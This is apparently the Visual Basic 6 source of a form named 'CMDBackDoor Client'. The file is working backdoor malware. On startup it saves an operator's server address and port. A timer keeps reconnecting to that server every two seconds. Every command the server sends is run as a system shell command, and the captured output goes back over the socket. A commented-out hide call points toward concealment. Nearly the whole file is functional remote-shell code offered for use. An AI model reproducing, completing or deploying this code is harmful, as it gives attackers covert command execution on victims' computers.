VERSION 5.00
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "CMDBackDoor Client"
   ClientHeight    =   9750
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   7695
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   9750
   ScaleWidth      =   7695
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer tmrcnt 
      Interval        =   2000
      Left            =   3540
      Top             =   8880
   End
   Begin VB.TextBox txtOutput 
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   3795
      Left            =   180
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   11
      Top             =   2820
      Width           =   7455
   End
   Begin VB.CommandButton Command 
      Caption         =   "getcommand"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Left            =   3450
      TabIndex        =   10
      Top             =   210
      Width           =   1245
   End
   Begin CMDBackDoorClient.ReadOutput ReadOutput1 
      Left            =   1605
      Top             =   8670
      _ExtentX        =   1720
      _ExtentY        =   1296
   End
   Begin VB.TextBox txtSend 
      Enabled         =   0   'False
      Height          =   285
      Left            =   75
      TabIndex        =   8
      Top             =   7410
      Width           =   7455
   End
   Begin VB.Frame fraConnect 
      Caption         =   "Connection Options"
      Height          =   1455
      Left            =   120
      TabIndex        =   2
      Top             =   120
      Width           =   3255
      Begin VB.CommandButton cmdConnect 
         Caption         =   "Connect"
         Height          =   375
         Left            =   1680
         TabIndex        =   7
         Top             =   960
         Width           =   1455
      End
      Begin VB.TextBox txtPort 
         Alignment       =   2  'Center
         Height          =   285
         Left            =   1080
         TabIndex        =   5
         Top             =   600
         Width           =   2055
      End
      Begin VB.TextBox txtIP 
         Alignment       =   2  'Center
         Height          =   285
         Left            =   1080
         TabIndex        =   3
         Top             =   240
         Width           =   2055
      End
      Begin VB.Label lblPort 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "On port"
         Height          =   195
         Left            =   120
         TabIndex        =   6
         Top             =   630
         Width           =   525
      End
      Begin VB.Label Label1 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Connect to:"
         Height          =   195
         Left            =   120
         TabIndex        =   4
         Top             =   270
         Width           =   825
      End
   End
   Begin VB.TextBox txtReceived 
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   600
      Left            =   120
      Locked          =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   0
      Top             =   2040
      Width           =   7455
   End
   Begin VB.Label lblstat 
      AutoSize        =   -1  'True
      Caption         =   "Stat"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   105
      TabIndex        =   12
      Top             =   7905
      Width           =   300
   End
   Begin VB.Label Label3 
      Alignment       =   1  'Right Justify
      BackStyle       =   0  'Transparent
      Caption         =   "(hit enter to send)"
      ForeColor       =   &H00808080&
      Height          =   255
      Left            =   60
      TabIndex        =   9
      Top             =   7875
      Width           =   7455
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Messages"
      Height          =   195
      Left            =   120
      TabIndex        =   1
      Top             =   1800
      Width           =   720
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Dim GetName As String
Dim Getip  As String
Dim Getport  As String

Private Sub cmdConnect_Click()
    If cmdConnect.Caption = "Connect" Then
        'Connect to the server
        theSocket = ConnectSock(txtIP.Text, Val(txtPort.Text), vbNullString, Me.hwnd, False)
        If theSocket = INVALID_SOCKET Then
            lblstat.Caption = "Error while connecting to server :("
        Else
            txtIP.Enabled = False
            txtPort.Enabled = False
            txtReceived.Enabled = True
            txtSend.Enabled = True
            Label3.ForeColor = vbBlue
            cmdConnect.Caption = "Disconnect"
            lblstat.Caption = "Connected"
        End If
    ElseIf cmdConnect.Caption = "Disconnect" Then
            'Close the connection with the server
            closesocket theSocket
            txtIP.Enabled = True
            txtPort.Enabled = True
            txtReceived.Enabled = False
            txtSend.Enabled = False
            Label3.ForeColor = RGB(128, 128, 128)
            cmdConnect.Caption = "Connect"
            lblstat.Caption = "Disconnect"
    End If
End Sub

Private Sub Form_Load()

    'Start WinSock... Must be called before any other winsock function call
    StartWinsock vbNullString
   
    MyExname = GetEXEName()

GetName = GetSetting(MyExname, "Save", "Name")
Getip = GetSetting(MyExname, "Save", "ip")
Getport = GetSetting(MyExname, "Save", "Port")
'MsgBox GetName & " / " & Getip & " / " & Getport
If Getip = "" Then GetName = ""
If Getport = "" Then GetName = ""


If GetName = "" Then
    NameInp = InputBox("Please Enter Name", "Name")
    If NameInp <> "" Then SaveSetting MyExname, "Save", "Name", NameInp
    
    NameInp = InputBox("Please Enter Server Ip", "Server-Ip")
    If NameInp <> "" Then SaveSetting MyExname, "Save", "ip", NameInp
    
    NameInp = InputBox("Please Enter Server Port", "Server-Port")
    If NameInp <> "" Then SaveSetting MyExname, "Save", "Port", NameInp
    MsgBox "OK... I will Close. Open Again", vbInformation, "successful"
    End
Else
    'Me.Hide
    txtIP.Text = Getip
    txtPort.Text = CStr(Getport)
    'start subclassing
    StartSubclass Me
    
    
End If

End Sub
Private Sub Form_Unload(Cancel As Integer)
    'Close the connection to the server
    closesocket theSocket
    'Stop subclassing
    StopSubclass Me
    'Uninitialize WinSock
    EndWinsock
End Sub

Private Sub tmrcnt_Timer()
If lblstat.Caption <> "Connected" Then cmdConnect_Click
End Sub

Private Sub txtReceived_Change()
CommacndSTR = Mid(txtReceived.Text, 2, Len(txtReceived.Text) - 1)
'MsgBox CommacndSTR

If InStr(txtReceived.Text, "FrsT") Then
    SendData theSocket, "N" & GetName
    txtOutput.Text = ""
    lblstat.Caption = "Connected"
Else
  If CommacndSTR <> "cmd" Then
    ReadOutput1.SetCommand = CommacndSTR
    ReadOutput1.ProcessCommand
  End If
End If




End Sub

Private Sub txtSend_KeyPress(KeyAscii As Integer)
    'If users hits 'Enter', send the string to the server
    If KeyAscii = 13 Then
        If LenB(txtSend.Text) = 0 Then
            MsgBox "No data to send..."
        Else
            SendData theSocket, txtSend.Text + vbCrLf
            AddText txtSend.Text
            txtSend.Text = ""
        End If
    End If
End Sub
Private Sub ReadOutput1_Complete()
    'MsgBox "Complete reading output!", vbOKOnly, "Success!" 'command is done
    
    SendData theSocket, "T" & txtOutput.Text + vbCrLf
    'AddText txtSend.Text
    txtOutput.Text = ""

End Sub

Private Sub ReadOutput1_Error(ByVal Error As String, LastDLLError As Long)
    'MsgBox "Error!" & vbNewLine & _
            "Description: " & Error & vbNewLine & _
            "LastDLLError: " & LastDLLError, vbCritical, "Error"
End Sub

Private Sub ReadOutput1_GotChunk(ByVal sChunk As String, ByVal LastChunk As Boolean)
    txtOutput.Text = txtOutput.Text & Replace(Replace(sChunk, Chr(13), ""), Chr(10), vbNewLine)

End Sub

Private Sub ReadOutput1_Starting()
    txtOutput.Text = "" 'reset because we dont want to have the old commands output
End Sub


